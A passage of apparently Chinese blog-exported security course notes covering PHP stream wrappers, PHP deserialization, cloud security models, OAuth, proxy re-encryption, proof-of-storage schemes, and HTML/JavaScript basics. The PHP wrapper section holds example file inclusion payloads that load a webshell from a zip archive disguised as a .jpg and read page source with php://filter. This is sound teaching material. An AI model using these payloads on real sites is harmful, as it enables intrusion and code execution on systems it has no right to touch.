title="PHP伪协议"></a>PHP伪协议</h2><p>PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、 file_exists() 和 filesize() 的文件系统函数，<strong>可在include命令中使用</strong>。除了这些封装协议，还能注册自定义的封装协议。常见的协议有：</p><ul><li>file:// — 访问本地文件系统</li><li>http:// — 访问 HTTP(s) 网址</li><li>ftp:// — 访问 FTP(s) URLs</li><li>php:// — 访问各个输入/输出流（I/O streams）</li><li>zlib:// — 压缩流</li><li>phar:// — PHP 归档</li></ul><br/><ol><li>php://filter<br>php://filter 是一种<strong>元封装器</strong>，设计用于<strong>数据流打开时的筛选过滤应用</strong>。php://filter可以读取本地文件的内容，还可以对读取的内容进行编码处理。被include等函数包含的文件会被当作PHP文件一样进行处理，如果被包含的文件中有PHP代码，那么PHP代码将会执行，文件中PHP代码以外的内容，会直接返回给客户端。利用这个特性，攻击者可以获取到web页面的源代码。为后续的渗透工作提供帮助。下面的例子中，攻击者对index.php内容进行了base64编码，将获取到的字符串在本地进行base64解码后就能得到index.php的内容。</li></ol><p><img src="/2023/03/17/web-shen-tou-shi-zhan/113ce7e3a06edf9301973d84e9239eb7.png" class="lazyload placeholder" data-srcset="/2023/03/17/web-shen-tou-shi-zhan/113ce7e3a06edf9301973d84e9239eb7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ol start="2"><li>phar://与zip://<br>phar://与zip://可以<strong>获取压缩文件内的内容</strong>，如在hack.zip的压缩包中，有一个shell.php的文件，则可以通过phar://hack.zip/shell.php的方式访问压缩包内的文件，zip://也是类似。这两个协议不受文件后缀名的影响，将hack.zip改名为hack.jpg后，依然可以通过这种方式访问压缩包内的文件。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*常用payload*/</span><br><span class="line">http://www.xxx.com/index.php?func=zip://hack.jpg%23shell.php</span><br><span class="line">/*zip协议的用法为zip://hack.jpg#shell.php，由于#在http协议中有特殊的含义，所以在发送请求时要对其进行url编码*/</span><br><span class="line">http://www.xxx.com/index.php?func=phar://hack.jpg/shell.php</span><br></pre></td></tr></table></figure><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><p><strong>序列化是指将对象、数组等数据结构转化为可以储存的格式的过程</strong>。程序在运行时，变量的值都是储存在内存中的，程序运行结束，操作系统就会将内存空间收回，<strong>要想要将内存中的变量写入磁盘中或是通过网络传输，就需要对其进行序列化操作，序列化能将一个对象转换成一个字符串。</strong> 在PHP中，序列化后的字符串保存了对象所有的变量，但是不会保存对象的方法，只会保存类的名字。java、python和php等编程语言都有各自的序列化的机制。</p><p>会创建一个example类的对象，并将其序列化后保存到<code>serialize.txt</code>中并打印到屏幕上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/*serialize.php*/</span><br><span class="line">&lt;?php</span><br><span class="line">class example&#123;</span><br><span class="line">    private $message=&#x27;hello world&#x27;;</span><br><span class="line">    public function set_message($message)&#123;</span><br><span class="line">        $this-&gt;message=$message;</span><br><span class="line">    &#125;</span><br><span class="line">    public function show_message()&#123;</span><br><span class="line">        echo $this-&gt;message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = new example();</span><br><span class="line">$serialized = serialize($object);</span><br><span class="line">file_put_contents(&#x27;serialize.txt&#x27;, $serialized);</span><br><span class="line">echo $serialized; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上述代码运行的结果为：<code>O:7:&quot;example&quot;:1:&#123;s:16:&quot; example message&quot;;s:11:&quot;hello world&quot;;&#125;</code></p><blockquote><p>O代表储存的是对象(object)，7代表类名有7个字符，example代表类名，1代表对象中变量个数，s表示字符串，16，代表长度，example message是类名及变量名。</p></blockquote><p><strong>将序列化后的字符串恢复为数据结构的过程就叫做反序列化。为了能够反序列化一个对象，这个对象的类在执行反序列化的操作前必须已经定义过。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/*unserialize.php*/</span><br><span class="line">&lt;?php</span><br><span class="line">class example&#123;</span><br><span class="line">    private $message=&#x27;hello world&#x27;;</span><br><span class="line">    public function set_message($message)&#123;</span><br><span class="line">        $this-&gt;message=$message;</span><br><span class="line">    &#125;</span><br><span class="line">    public function show_message()&#123;</span><br><span class="line">        echo $this-&gt;message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$serialized = file_get_contents(&quot;serialize.txt&quot;);</span><br><span class="line">$object = unserialize($serialized);</span><br><span class="line">$object-&gt;set_message(&#x27;unserialized success&#x27;);</span><br><span class="line">$object-&gt;show_message();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上述代码执行完后会在屏幕上打印“unserialized success”。</p><h2 id="PHP魔法方法"><a href="#PHP魔法方法" class="headerlink" title="PHP魔法方法"></a>PHP魔法方法</h2><p>PHP有一类特殊的方法，它们以**__(两个下划线)开头**，在特定的条件下会被调用，例如类的构造方法__construct()，它在实例化类的时候会被调用。<br>下面是PHP中常见的一些魔术方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__construct()，类的构造函数，创建新的对象时会被调用</span><br><span class="line">__destruct()，类的析构函数，当对象被销毁时会被调用</span><br><span class="line">__call()，在对象中调用一个不可访问方法时会被调用</span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line">__get()，读取一个不可访问属性的值时会被调用</span><br><span class="line">__set()，给不可访问的属性赋值时会被调用</span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure><blockquote><p>下面是一个使用PHP魔术方法的类的示例，在反序列化时，类中的__wakeup()方法会被调用，并输出“Hello World”</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class magic&#123;</span><br><span class="line">function __wakeup()&#123;</span><br><span class="line">        echo &#x27;Hello World&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = new magic();</span><br><span class="line">$serialized = serialize($object);</span><br><span class="line">unserialize($serialized);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><p>PHP反序列化漏洞又叫PHP对象注入漏洞。</p><p>在一个应用中，如果传给unserialize()的<strong>参数是用户可控的</strong>，那么攻击者就可以通过传入一个<strong>精心构造的序列化字符串</strong>，利用PHP魔术方法来<strong>控制对象内部的变量甚至是函数</strong>。</p><p>对这一类漏洞的利用，往往需要分析web应用的源代码。</p><blockquote><p>时间有限，实验不作演示。具体应用案例、实现过程参考书籍</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云安全</title>
      <link href="/2023/03/17/yun-an-quan/"/>
      <url>/2023/03/17/yun-an-quan/</url>
      
        <content type="html"><![CDATA[<h2 id="云计算服务模式"><a href="#云计算服务模式" class="headerlink" title="云计算服务模式"></a>云计算服务模式</h2><p><strong>云计算概述</strong></p><p>云计算正在逐渐成为信息技术领域的主流计算模式和存储模式</p><ol><li>具有可靠性高、弹性配置强、按需服务等特点</li><li>为用户提供灵活便捷的计算和存储服务</li><li>大大降低了用户的软硬件投入和管理成本</li><li>是互联网时代的一次重大技术创新和产业革命</li></ol><p><strong>云计算服务模式</strong></p><p>云计算的服务可以概括为以下服务模式：</p><ol><li>软件即服务模式(Saas)</li><li>平台即服务模式(PaaS)</li><li>基础架构即服务模式(IaaS)</li><li>存储即服务模式(STaaS)</li></ol><p>不论哪一种服务模式，用户都是通过网络实现对云服务的访问，所采用的交互式协议包括HTTP协议、REST架构和RESTful架构等。</p><p><strong>REST架构</strong></p><p>REST架构使用统一资源标识符(URI)和HTTP协议的PUT、POST、GET等函数实现对云服务的访问，并结合了HTML语言、XML语言及JSON格式等标准</p><p>例如，用户想知道在某个云平台上使用的CPU时间，其中云平台记录CPU时间的URI为http:/sky.cloud/user/johndoe/usage，则可以通过执行HTTP的GET指令向这个URI发出请求，从云服务器上获得CPU使用时间</p><br/><p><strong>软件即服务模式(SaaS)</strong></p><p>云服务提供商向用户直接提供各种应用软件服务，并负责这些应用软件的运行和维护，可以为用户节省大量的维护成本</p><p>用户除了使用这些软件服务外，通常不能访问云上的其它资源，与<code>PaaS</code>和<code>IaaS</code>等模式相比，具有最小的访问权限</p><p>例如GmailE邮箱、Yahool邮箱等，以及各种社交网络平台，例如Facebook、Twitter以及Google+-等，都是SaaS模式的典型应用</p><br/><p><strong>平台即服务模式(PaaS)</strong></p><p>在平台即服务模式下，用户可以在云上部署实施自己的应用软件，而由云服务提供商负责管理和维护整个云基础设施</p><p>PaaS模式的经典范例，包括谷歌应用引擎(GAE)和亚马逊网页服务(AWS)等</p><br/><p><strong>基础架构即服务模式(IaaS)</strong></p><p>在基础架构即服务模式下，用户可以在云上部署实施自己所需的操作系统和应用软件，而云服务提供商只负责服务器等物理设备的管理和维护</p><p>典型的应用范例，例如亚马逊的弹性计算云服务(EC2)，阿里云，腾讯云等</p><br/><p><strong>存储即服务模式(STaaS)</strong></p><p>存储即服务模式，又称为云存储，是一种新型云服务模式，不在美国NIST制定的三大云计算服务模式(SaaS、PaaS和IaaS)之列，但是近年来发展非常迅速</p><p>在云存储模式下，云服务提供商负责管理和维护大规模的存储设备资源，用户可以通过REST等协议实现对云存储空间的访问</p><p>典型的云存储范例，包括亚马逊的S3、Dropbox、Google Drive以及<strong>百度网盘</strong>等</p><br/><h2 id="云安全模型和多租户共享"><a href="#云安全模型和多租户共享" class="headerlink" title="云安全模型和多租户共享"></a>云安全模型和多租户共享</h2><p><strong>云安全模型</strong></p><p>在任何安全模型下进行安全性分析，首先需要明确模型中假想敌的攻击能力</p><p><strong>在云计算环境下，假想敌就是云服务提供商本身。</strong>下面将描述云计算的三种假想敌模型：可信第三方模型(TTP)，诚实而好奇模型(HBC)，以及半诚实而好奇模型(SHBC)</p><br/><p><strong>可信第三方模型</strong></p><p>在可信第三方模型(TTP)下，用户完全信任云服务提供商，这种信任通过签署服务等级协议(SLA)来完成。在TTP模型下，用户的所有数据和计算对云服务提供商都是不设防的，因此具有一定的安全风险。</p><p>在现实中，很多云计算系统都属于可信第三方模型，这是安全性最弱的一种模型</p><br/><p><strong>诚实而好奇模型(HBC)</strong></p><p>在诚实而好奇模型(HBC)下，云服务端与用户之间的交互过程具有以下特点：</p><ol><li>根据用户需求，云服务端诚实地存储用户的数据</li><li>云服务端严格地按照事先规定的协议一步步执行</li><li>在与用户的交互过程中，云服务端会<strong>尽可能地获取用户的各种信息</strong></li></ol><p>诚实而好奇模型比可信第三方模型更灵活，与加密通信中的窃听安全模型很相似</p><br/><p><strong>半诚实而好奇模型(SHBC)</strong></p><p>在半诚实而好奇模型(SHBC)下，云服务端有可能不完全按照协议的规定执行操作，与用户之间的交互具有以下特点：</p><ol><li>诚实地根据用户需求存储用户数据。</li><li>或者严格地按照事先规定的协议一步步执行，或者只执行其中的一部分。</li><li>在与用户交互过程中，有可能只返回部分计算结果。</li><li>在与用户的交互过程中尽可能地获取用户的信息。</li></ol><br/><p><strong>多租户共享</strong></p><p>云计算环境中，大量用户会通过虚拟化技术共享使用云端的服务器等硬件设备，存储各自的数据或安装各自的应用软件等。由此产生的安全问题称为多租户问题。在这种环境中，需要考虑如何避免不同用户之间相互影响，并防止用户之间的数据泄露。</p><br/><p><strong>虚拟化</strong></p><p>虚拟化技术(virtualization)是在计算机硬件资源上使用软件模拟出多个逻辑系统的技术，例如在一个硬件平台上同时运行多个操作系统，即构建多个“虚拟机”</p><p>虚拟化技术，包括基于软件的虚拟化和硬件辅助的虚拟化，是云计算中的关键技术之一</p><p>虚拟机是建立在**虚拟机管理器(Hypervisor)**上的，虚拟机管理器负责向“虚拟机”提供对各种软硬件资源的访问</p><ol><li>基于软件的虚拟化</li></ol><p>在实体机的操作系统之上运行虚拟机管理器，实体机上用于支撑虚拟机管理器的的操作系统称为宿主操作系统，而运行在虚拟机管理器上面的虚拟机操作系统则称为客户操作系统。代表产品有Virtual Box和Vmware</p><ol start="2"><li>硬件辅助的虚拟化</li></ol><p>虚拟机管理器以固件的形式直接运行在实体机的硬件上，实体机操作系统和各个虚拟机都运行在虚拟机管理器之上。代表产品Oracle公司的SPARC VM</p><br/><p><strong>多租户问题的攻击</strong></p><p>在多租户的云计算环境中，侧信道攻击和共存攻击是最主要的攻击方式：</p><ol><li>侧信道攻击从云计算环境中的信息处理和交互过程中获取有用的辅助信息，从而达到攻击目的。例如，通过监控某台虚拟机的网络流量和繁忙程度便可获知其重要程度。</li><li>共存攻击攻击者利用云计算系统存在的软件漏洞或使用其它方法，在其试图攻击的虚拟机所运行的硬件上，建立一台新的虚拟机，这样两台虚拟机运行在相同的硬件资源上，攻击者能够更有效地进行侧信道攻击</li></ol><br/><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><p><strong>访问控制</strong></p><p>云计算环境中的访问控制，其目的是管理用户对硬件资源的访问，存在两种访问控制模式：</p><ol><li>在强制访问控制模型（可信云中）下，云平台系统管理员统一为所有的硬件资源建立访问控制策略，并授予每个用户不同的访问权限</li><li>在自主访问控制模式（不可信云中）下，每个用户拥有自己所控制的硬件资源，而且能给其他用户授权</li></ol><p>在实施访问控制策略之前，云平台首先要认证用户的身份，常见的身份认证方法包括基于口令的认证方式、Kerberos等。</p><br/><p><strong>可信云中的访问控制</strong></p><p>如果用户完全信任云服务提供商，就可以由云端实现对用户文件和数据的访问控制管理，即强制访问控制模式。</p><p>在这种模式下，所有用户的资源都是由云端统一管理的用户使用基于口令的认证机制等方法实现对资源的访问控制。</p><p>当用户通过了身份认证，就拥有了相应资源的访问权限，同时用户还可以把数据资源分享给其他用户。</p><br/><p><strong>OAuth身份认证协议</strong></p><p>用户在不泄露自己账号信息的前提下，将某些资源的访问权限授权给其他用户，是<strong>自主访问控制模式</strong>的一种形式。</p><p>OAuth协议可实现这个功能，它是运行在HTTP协议之上的协议，在RFC 5849文档中有详细描述(OAuth版本1.0)</p><p>OAuth协议包括三种对象：服务器、客户端、及资源拥有者：</p><ul><li>服务器是接受OAuth请求的主体</li><li>客户端是建立OAuth请求的主体</li><li>资源拥有者是既能访问保护资源、又能授权他人访问的主体</li></ul><br/><p><strong>OAuth身份认证协议流程</strong></p><ol><li>客户端向服务器发送一个申请临时访问权限的<code>OAuth</code>请求</li><li>服务器给客户端返回一个临时的访问令牌</li><li>客户端向资源拥有者发送一个包含了临时访问令牌的URI，资源拥有者通过这个URI可以打开要访问资源的口令认证登录界面，如果资源拥有者登录成功，那么客户端将被允许访问这些资源</li><li>如果资源拥有者通过了访问请求，这个访问许可会被转发到一开始的<code>OAuth</code>请求中的回调URI中，即资源拥有者向客户发放许可</li><li>客户端用临时访问令牌向服务器申请正式令牌，这个申请过程通过SSL连接进行保护，并用客户端和服务端共享的密钥签名</li><li>服务器向客户端发送一个签名后的包含正式令牌的消息</li><li>客户端用正式令牌向服务器发送访问某个资源的请求，服务器将验证令牌的合法性，验证通过后，客户端能够访问这个资源。注意，资源拥有者可以根据情况撤销某个令牌</li></ol><p><img src="/2023/03/17/yun-an-quan/1a66bd0d4fe344a5d27bb589f06623f3.png" class="lazyload placeholder" data-srcset="/2023/03/17/yun-an-quan/1a66bd0d4fe344a5d27bb589f06623f3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>不可信云中的访问控制</strong></p><p>在不可信的云环境中，用户需要自己来实施和配置<strong>身份认证</strong>和<strong>访问控制机制</strong></p><p>采用最基本的密码算法，可实现一个简单的访问控制策略：</p><ul><li>用户将数据进行加密，把密文数据存储到远程的云端</li><li>在用户不泄露自己密钥的前提下，采用<strong>代理重加密</strong>方案，实现云上的多用户之间的密文数据的分享和访问控制</li></ul><br/><p><strong>BBS代理重加密方案</strong></p><p>I998年，Matthew Blaze，Gerrit Bleumer和Martin Strauss提出了BBS代理重加密方案</p><p>代理者可以将Alice能够解密的密文转化成Bob能够解密的密文。代理者是一个被信任的角色，会诚实地完成重加密，但会企图获取用户私钥、明文等秘密信息</p><p>在协议执行过程中，Bob不能获得Alice的私钥。在代理重加密方案中，称Alice为委托方，称Bob为受托方。</p><p>代理重加密方案分为单向和双向两种类型：</p><ol><li>单向代理重加密方案：只能从一方向另一方进行重新加密</li><li>双向代理重加密方案：可以在双方之间互相进行重新加密</li></ol><p>BBS代理重加密方案是一种双向代理重加密方案，其采用了Elgamal公钥加密算法</p><p>实现流程：</p><ol><li><p>系统参数建立：选取一个大素数p以及p的原根g，将g和p作为公开的参数</p></li><li><p>密钥生成：委托方Alice均匀随机地选取一个正整数a&lt;p作为自己的私钥，计算g^a(mod p)作为自己的公钥。Bob是受托方，Alice随机地选取一个正整数b&lt;p，并通过秘密的信道将b发送给Bob，作为Bob的私钥。Bob计算g^b(mod p)作为自己的公钥</p></li><li><p>加密：Alice用Elgamal公钥加密算法对消息m进行加密，将密文发给代理Eve</p></li></ol><ul><li>均匀地随机选取一个正整数k</li><li>计算密文(mg^(ak) mod p，g^k mod p)</li><li>Alice将密文发给代理Eve</li></ul><p>解密：对于密文(mg^(ak) mod p，g^k mod p)，Alice用自己的私钥a解密密文如下：<br><code>(mg^ak mod p)(g^(ka) mod p)^(-1) = m</code></p><ol start="4"><li>重加密密钥生成</li></ol><p>当Alice想授权给Bob，使Bob能够解密密文，Alicel向代理者Eve发送**(b/a)**作为重加密密钥，由Eve重新加密密文并发给Bob</p><ol start="5"><li>重加密</li></ol><p>对于密文(mg^(ak) mod p，g^k mod p)，代理方使用重加密密钥(b/a)进行重加密如下：<code>(mg^(ak(b/a)) mod p，g^k mod p)</code></p><p>将重加密后的密文发给Bob。对于这个密文，Bob可以用自己的私钥b进行解密</p><br/><h2 id="不可信云的安全问题"><a href="#不可信云的安全问题" class="headerlink" title="不可信云的安全问题"></a>不可信云的安全问题</h2><p><strong>不可信云的安全问题</strong></p><p>不可信云环境中的两个安全问题：</p><ul><li>存储在云上的数据所面临的安全问题</li><li>在虚拟机上进行的计算（称为<code>外包计算</code>）</li></ul><br/><p><strong>存储证明</strong></p><p>在STaaS云环境中，首要的安全性问题是保证云端确实按照用户要求存储了数据。因此，需要云端出具不可伪造的证据来证明存储数据的正确性。</p><p>采用<code>挑战-应答机制</code>的存储证明协议的主要步骤如下：</p><ul><li>用户发起请求，要求云端证明其正确存储了文件f</li><li>云端向用户返回一个短的证明，用来证实他正确存储了文件f</li><li>用户<strong>接收并验证</strong>云端发来的证明，如果验证通过，则证明云端确实存储了文件；否则，确认云端没有正确存储这个文件</li></ul><br/><p><strong>存储证明：基于RSA的挑战-应答机制</strong></p><p>设<code>n</code>是两个大素数<code>p</code>和<code>q</code>的乘积，<code>g</code>是随机选取的一个正整数。本方案包括系统建立和挑战两个阶段。</p><ol><li>系统建立阶段：<ol><li>用户计算并保存<code>a=g^f mod n</code></li><li>用户将文件<code>f</code>发给云端</li></ol></li><li>挑战阶段：<ol><li>挑战：用户随机地选取一个整数<code>r</code>，计算<code>g^r mod n</code>的值并发给云端，</li><li>响应：云端计算<code>p=(g^r)^f mod n</code>，并将存储证明<code>p</code>发给用户</li><li>验证：用户计算<code>a^r mod n</code>，并与<code>p</code>比较是否相等。如果相等，则验证成功，否则验证失败，</li></ol></li></ol><br/><p><strong>安全多方计算</strong></p><p>安全多方计算是指多个互不信任的参与者联合计算一个函数，使得每个参与者在不泄露各自输入内容的前提下获得计算结果。</p><p>在云计算中，安全多方计算可以用于解决外包计算问题，云端凭借强大的计算能力为用户计算某些复杂运算，但是云端不能获得计算结果之外的其它信息。这种特殊的场景也被称为“安全函数计算”</p><blockquote><p>姚氏百万富翁问题</p><p><img src="/2023/03/17/yun-an-quan/e5be744a34e3454099c58184a844b444.png" class="lazyload placeholder" data-srcset="/2023/03/17/yun-an-quan/e5be744a34e3454099c58184a844b444.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/17/yun-an-quan/9f669e201452e0562367d6e3909c9a3d.png" class="lazyload placeholder" data-srcset="/2023/03/17/yun-an-quan/9f669e201452e0562367d6e3909c9a3d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/17/yun-an-quan/e24009ff0a88eb7c4242cf5f16b4b7aa.png" class="lazyload placeholder" data-srcset="/2023/03/17/yun-an-quan/e24009ff0a88eb7c4242cf5f16b4b7aa.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></blockquote><br/><p><strong>不经意传输</strong></p><p><img src="/2023/03/17/yun-an-quan/a1f6c2137942119ae270318bc357b8ef.png" class="lazyload placeholder" data-srcset="/2023/03/17/yun-an-quan/a1f6c2137942119ae270318bc357b8ef.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/17/yun-an-quan/edd25b1c065b8bec1ae5270172dafa5e.png" class="lazyload placeholder" data-srcset="/2023/03/17/yun-an-quan/edd25b1c065b8bec1ae5270172dafa5e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>总结：EGL协议利用RSA公钥算法实现不经意传输</strong></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全基础</title>
      <link href="/2023/03/16/web-an-quan-ji-chu/"/>
      <url>/2023/03/16/web-an-quan-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB基础"><a href="#WEB基础" class="headerlink" title="WEB基础"></a>WEB基础</h1><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p><strong>超文本传输协议</strong>（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的<strong>WWW文件</strong>都必须遵守这个标准。设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。通过HTTP或者HTTPS协议请求的资源由<strong>统一资源标示符</strong>（Uniform Resource Identifiers）（或者，更准确一些，<strong>URLs</strong>）来标识。 </p><p>关于HTTP协议的详细内容请参考<strong>RFC2616</strong>。HTTP协议采用了<strong>请求/响应模型</strong>。客户端向服务器发送一个请求，请求头包含请求的方法、URL、协议版本、以及包含请求修饰符、客户信息和内容的类似于<strong>MIME</strong>的消息结构。服务器以一个<strong>状态行</strong>作为响应，响应的内容包括消息协议的版本，成功或者错误编码加上包含服务器信息、实体元信息以及可能的实体内容。</p><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>“<strong>超文本</strong>”就是指<u>页面内可以包含图片、链接，甚至音乐、程序等非文字元素</u>。超文本标记语言Html的结构包括<strong>“头”部分</strong>（英语：Head）、和<strong>“主体”部分</strong>（英语：Body），其中“头”部提供关于网页的信息，“主体”部分提供网页的具体内容。<br><strong>一个网站对应多个HTML文件</strong>，超文本标记语言文件以<code>.htm</code>（磁盘操作系统DOS限制的外语缩写）为扩展名或<code>.html</code>（外语缩写）为扩展名。可以使用任何能够生成TXT类型源文件的文本编辑器来产生超文本标记语言文件，只用修改文件后缀即可。</p><p>标准的超文本标记语言文件都具有一个基本的整体结构</p><ul><li>标记一般都是成对出现（部分标记除外例如：&lt;br/&gt;），即超文本标记语言文件的开头与结尾标志和超文本标记语言的头部与实体两大部分。有三个双标记符用于页面整体结构的确认。</li><li>标记符&lt;html&gt;，说明该文件是用超文本标记语言（本标签的中文全称）来描述的，它是文件的开头;而&lt;/html&gt;，则表示该文件的结尾，它们是超文本标记语言文件的开始标记和结尾标记。</li><li>&lt;head&gt;&lt;/head&gt;<blockquote><p>这2个标记符分别表示<strong>头部信息的开始和结尾</strong>。头部中包含的标记是页面的<strong>标题、序言、说明等内容</strong>，它本身不作为内容来显示，但影响网页显示的效果。头部中最常用的标记符是<u>标题标记符和meta标记符</u>，其中标题标记符用于定义网页的标题，它的内容显示在网页窗口的<strong>标题栏</strong>中，网页标题可被浏览器用作书签和收藏清单。</p></blockquote></li><li>&lt;body&gt;&lt;/body&gt;<blockquote><p>网页中显示的实际内容均包含在这2个正文标记符之间。正文标记符又称为实体标记。</p></blockquote></li></ul><p><img src="/2023/03/16/web-an-quan-ji-chu/d433462e01624791ecdf0baeba601c27.png" class="lazyload placeholder" data-srcset="/2023/03/16/web-an-quan-ji-chu/d433462e01624791ecdf0baeba601c27.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><p>JavaScript一种<strong>直译式脚本语言</strong>，它的<strong>解释器</strong>被称为JavaScript引擎，为浏览器的一部分，广泛用于<strong>客户端的脚本语言</strong>，最早是在HTML（标准通用标记语言下的一个应用）网页上使用，用来给HTML网页增加<strong>动态功能</strong>。<br>JavaScript是一种属于网络的脚本语言，已经被广泛用于Web应用开发，常用来为网页添加各式各样的动态功能,为用户提供更流畅美观的浏览效果。<u>通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的</u>。</p><p>Javascript脚本语言和其他语言一样</p><ul><li>有它自身的基本数据类型，表达式和算术运算符及程序的基本程序框架。Javascript提供了四种基本的数据类型和两种特殊数据类型用来处理数据和文字。而变量提供存放信息的地方，表达式则可以完成较复杂的信息处理。</li><li>嵌入动态文本于HTML页面、对浏览器事件做出响应、读写HTML元素、在数据被提交到服务器之前验证数据、检测访客的浏览器信息、<strong>控制cookies</strong>，包括创建和修改等。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>Javascript简单示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">                     <span class="title function_">alert</span>(<span class="string">&quot;第一个javascript&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">               </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   </span><br><span class="line">         <span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="HTTP会话管理"><a href="#HTTP会话管理" class="headerlink" 